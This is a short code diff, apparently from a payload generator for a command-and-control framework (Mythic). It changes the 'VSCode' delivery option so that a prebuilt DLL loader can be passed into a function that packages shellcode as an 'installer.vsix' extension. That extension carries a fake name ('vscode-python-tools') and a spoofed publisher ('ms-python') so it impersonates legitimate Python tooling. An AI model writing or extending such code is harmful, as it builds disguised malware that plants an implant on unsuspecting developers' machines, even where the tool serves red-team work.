@@ -5815,6 +5815,12 @@ generated if none have been entered.""",
                             )
 
                         case "VSCode":
+                            _vsix_prebuilt = None
+                            try:
+                                if loader_format == "dll" and os.path.exists(payload_output_file):
+                                    _vsix_prebuilt = pathlib.Path(payload_output_file)
+                            except NameError:
+                                pass
                             trigger_path = create_vscode_ext_trigger(
                                 shellcode_path=pathlib.Path(mythic_shellcode_path),
                                 payload_dir=payload_dir,
@@ -5822,6 +5828,7 @@ generated if none have been entered.""",
                                 fake_name=self.get_parameter("0.9w VSCode Fake Name") or "vscode-python-tools",
                                 publisher=self.get_parameter("0.9x VSCode Publisher") or "ms-python",
                                 output_filename="installer.vsix",
+                                prebuilt_dll_path=_vsix_prebuilt,
                             )
 
                             if trigger_path and pathlib.Path(trigger_path).exists():
